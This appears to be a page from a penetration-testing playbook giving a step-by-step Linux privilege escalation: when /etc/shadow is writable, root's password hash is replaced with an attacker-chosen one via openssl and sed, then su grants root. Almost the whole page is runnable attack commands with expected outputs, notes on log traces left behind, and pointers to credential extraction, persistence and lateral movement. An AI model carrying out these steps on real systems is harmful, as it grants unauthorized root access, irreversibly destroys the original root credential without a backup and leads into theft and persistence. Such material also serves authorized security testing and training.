
⚠️ **Hard preconditions — verified in Step 1.**

- **/etc/shadow is writable by the current user** on the target.
- **Destructive without backup.** Root's existing hash is overwritten in place. Step 2 takes a backup if /etc/shadow is also readable; without that, original password cannot be recovered.
- **Target user is the UID-0 account verified in Step 1.** Commands below assume `root` (the typical case); substitute throughout Steps 4–5 if Step 1 reveals a different UID-0 username.

No external lookup needed — preconditions checked in Step 1 below.

---

## Step 1 — Preflight verification

### Confirm /etc/shadow is writable by current user:

`test -w /etc/shadow && echo "WRITABLE" || echo "NOT WRITABLE"`

- `WRITABLE` → proceed.
- `NOT WRITABLE` → walkthrough doesn't apply.

### Enumerate UID-0 account(s): 

`awk -F: '$3 == 0 {print $1}' /etc/passwd` 

- `root` → proceed with Step 4/5 commands as written. 
- Different username → substitute that name for `root` in Steps 4 and 5. 
- Multiple names → pick one; conventionally `root` if present. 
- No output → no UID-0 account exists; walkthrough doesn't apply (extremely unusual; investigate target).

---

## Step 2 — Backup /etc/shadow (if readable)

`test -r /etc/shadow && install -m 600 /etc/shadow /tmp/.shadow.bak && echo "BACKUP CREATED" || echo "NO BACKUP — destructive"`

- `BACKUP CREATED` → restoration available at Step 6 cleanup. Proceed.
- `NO BACKUP — destructive` → /etc/shadow not readable to current user; root's original password cannot be restored. Proceed.

---

## Step 3 — Generate replacement hash (on attacker)

`openssl passwd -6`

Enter chosen password at both prompts. Output line is the SHA-512 hash in the form `$6$<salt>$<hash>`.

Copy the entire hash string for Step 4.

---

## Step 4 — Replace root's hash (on target)

**Assumes `root` is the target user.** If escalating to a different UID-0 account, adjust the username accordingly. 

Single-quoted to keep the shell from interpreting `$` characters in the hash:

`sed 's|^root:[^:]*:|root:<hash_from_step_3>:|' /etc/shadow > /tmp/shadow.new && cp /tmp/shadow.new /etc/shadow && rm /tmp/shadow.new`

Replace `<hash_from_step_3>` with the openssl output verbatim.

Verify:

`grep '^root:' /etc/shadow`

- Output shows `root:$6$<salt>$<hash>:...` with the new hash inline → proceed to Step 5.
- Output unchanged from original / no output → sed substitution failed. Re-check delimiter conflicts (the `|` delimiter is chosen because hashes contain `/`; a salt containing `|` would break the command, though openssl's base64 alphabet excludes it).

---

## Step 5 — Elevate

`su -`

Enter the password chosen in Step 3.

- Prompt returns `#`; `id` shows `uid=0(...)` → root achieved. Proceed to Step 6.
- "Authentication failure" → hash insertion mangled the line, or password mistyped. Re-verify Step 4's grep output character-for-character against the Step 3 openssl output.
- `su` rejects with "su: must be run from a terminal" → not in a real TTY; see [[Reverse Shell Stabilization]].

---

## Step 6 — Cleanup (if backup taken at Step 2)

From the root shell:

`test -f /tmp/.shadow.bak && cp /tmp/.shadow.bak /etc/shadow && rm /tmp/.shadow.bak && echo "RESTORED, BACKUP REMOVED" || echo "NO BACKUP TO RESTORE"`

- `RESTORED, BACKUP REMOVED` → /etc/shadow restored. Operator's password no longer valid for future `su` attempts; current root shell remains.
- `NO BACKUP TO RESTORE` → no Step 2 backup was taken; modification stands.

⚠️ `auth.log` retains the `su -` attempt; `~/.bash_history` retains command invocations. Log cleanup is out of scope.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]